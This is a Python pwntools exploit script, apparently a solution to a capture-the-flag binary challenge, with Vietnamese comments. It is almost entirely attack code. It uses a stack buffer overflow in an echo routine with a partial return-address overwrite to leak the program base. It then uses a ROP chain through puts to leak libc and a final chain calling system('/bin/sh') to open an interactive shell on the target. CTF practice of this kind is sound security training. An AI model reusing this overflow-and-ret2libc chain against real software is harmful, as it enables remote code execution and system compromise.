#!/usr/bin/env python3

from pwn import *

exe = ELF("./challenge_patched", checksec=False)
libc = ELF("./libc.so.6",checksec=False)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    gdb.attach(r, gdbscript='''
    b *echo
    c
    ''')
    # input()
    payload = b'A'*279
     # neu nhap qua 280 byte no se ghi de luon phan rip
    # payload += exe.sym['main'] & 0xffff.encode()
    payload += b'\x4c'
 
    r.sendlineafter(b'Echo2\n',b'281')
    r.send(payload)
    r.recvline()
    r.recv(279)
    exe_leak = u64(r.recv(6).ljust(8, b'\0'))
    exe.address = exe_leak - 4684
    log.info('exe_base :' + hex(exe.address))
    ret = exe.address + 0x101a
    payload = b'B'*279
    # payload += p64(exe.sym['main']+5)
    # payload += p64(ret)
    payload += p64(exe.plt['puts'])
    payload += p64(ret)
    payload += p64(exe.sym['main']+103)
 
    r.sendlineafter(b'Echo2\n',b'304')
    r.send(payload)

    r.recv(0x126)
    libc_leak = u64(r.recv(6).ljust(8,b'\0'))
    libc.address = libc_leak - 401616
    log.info("libc_leak :"+ hex(libc.address))
    
    r.recvline()
    rdi = libc.address + 0x2a3e5
    bin_sh = next(libc.search(b"/bin/sh"))
    payload3 = b'C'*279
    payload3 += p64(rdi)
    payload3 += p64(bin_sh)
    payload3 += p64(libc.sym['system'])
    payload3 += p64(ret)
    r.sendlineafter(b'Echo2\n',b'312')
    r.send(payload3)

    r.interactive()


if __name__ == "__main__":
    main()
